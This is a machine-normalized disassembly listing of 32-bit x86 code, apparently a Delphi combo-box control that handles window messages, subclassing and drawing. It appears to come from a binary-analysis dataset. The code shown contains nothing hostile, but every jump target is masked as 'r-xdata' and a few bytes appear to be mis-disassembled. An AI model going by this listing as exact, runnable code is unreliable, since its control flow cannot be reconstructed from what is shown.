mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_433870
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4338c4
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403420
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_4338f0
push ebx
mov ebx eax
mov eax ebx
call sub_43f384
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_433928
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_4339be
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4339c5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_4339c5
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_4339e4
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_433a14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_433a93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433a9a
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_433aa0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_433ae0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_433b29
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433b30
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_433b38
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_432d74
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_4031f4
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_433bbc
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403224
mov eax [ esi + 0x278 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_432e68
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_433bf8
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_43f96c
sub_433c5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f258
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43f184
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_433cbd
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_4338f0
mov eax ebx
call sub_4423cc
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403224
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_4423cc
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_433e00
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43f768
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_433e50
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_433ea4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_433ed0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_433f8c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43bbcc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_4044bc
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43bbfc
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_4068ac
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f93
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_433f98
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434350
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434357
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403f80
lea eax [ ebp - 0x44 ]
call sub_403f5c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f80
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_43bbcc
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fb0
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f5c
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_433ea4
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_433ed0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40421c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bda4
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43bbcc
mov eax [ ebp - 0x38 ]
call sub_40421c
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403420
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_432f34
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40421c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40421c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044bc
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43bbcc
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432f58
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_433ea4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432f34
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bda4
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404144
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404268
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_40447c
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404144
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404268
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_432f58
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_40447c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_40447c
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404268
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_43bbfc
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_4068ac
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43bbcc
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fb0
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_434360
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404144
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404268
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_434360
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_434360
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434515
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40421c
test eax eax
jne r-xdata
mov eax esi
call sub_40441c
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403420
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43451c
lea eax [ ebp - 0x1c ]
call sub_403f5c
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f80
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403fb0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40421c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_40447c
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404268
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43bbfc
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x1c ]
call sub_40421c
push eax
mov eax esi
call sub_40421c
pop edx
call sub_4068ac
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403420
mov eax ebx
mov si 0xffb2
call sub_403420
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_434548
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41d5b0
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41d450
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41d46c
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41d034
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cc90
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c4c4
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41d5b0
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_434620
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_43464c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d268
mov eax ebx
call sub_43bdf4
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_452980
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43c28c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43be04
sub_4346c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_4334cc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_434720
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44055c
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434949
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a7a8
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cc90
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d070
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d070
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b56c
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cc90
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d070
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d070
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_432f34
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawFrameControl
jmp r-xdata
sub_43495c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e0c4
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_434980
push ebx
mov ebx eax
mov eax ebx
call sub_448194
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4349b8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_434a0e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_434a1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43e0f8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_434a70
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442e9c
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_434ac4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
